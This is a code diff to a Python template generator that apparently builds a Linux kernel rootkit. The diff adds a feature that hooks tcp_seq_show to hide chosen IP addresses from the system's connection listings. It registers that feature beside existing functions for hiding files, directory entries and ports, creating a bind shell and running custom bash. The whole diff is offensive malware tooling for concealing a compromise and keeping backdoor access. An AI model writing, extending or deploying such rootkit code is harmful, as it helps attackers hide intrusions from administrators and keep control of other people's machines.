@@ -76,6 +76,19 @@ class TemplateGenerator:
 
         for x in items:
             self.template_init += "hide_port(\""+x+"\");\n"
+    
+
+    def hide_ip(self, items, hooked):
+        if not self.connector:
+            self.template_head += "#include \"hooker/tcp_seq_show.h\"\n"
+            self.template_head += "#include \"mods/hideip.h\"\n"
+            if not hooked:
+                self.template_init += "install_tcp_seq_show_hook();\n"
+                self.template_clear += "remove_tcp_seq_show_hook();\n"
+
+        for x in items:
+            self.template_init += "hide_ip(\""+x+"\");\n"
+
 
     def shells(self, items):
         if not self.connector:
@@ -96,6 +109,7 @@ class TemplateGenerator:
         #include "mods/hideme.h"
         #include "mods/hidedent.h"
         #include "mods/hideport.h"
+        #include "mods/hideip.h"
         #include "mods/bindshell.h"
         #include "mods/runshell.h"
         """
@@ -111,6 +125,8 @@ class TemplateGenerator:
         add_function("SHOW_HIDDEN_DENT", show_hidden_dent);
         add_function("HIDE_PORT", hide_port);
         add_function("SHOW_HIDDEN_PORT", show_hidden_port);
+        add_function("HIDE_IP", hide_ip);
+        add_function("SHOW_HIDDEN_IP", show_hidden_ip);
         add_function("BINDSHELL_CREATE", bindshell_create);
         add_function("RUN_CUSTOM_BASH", run_custom_bash);
         """
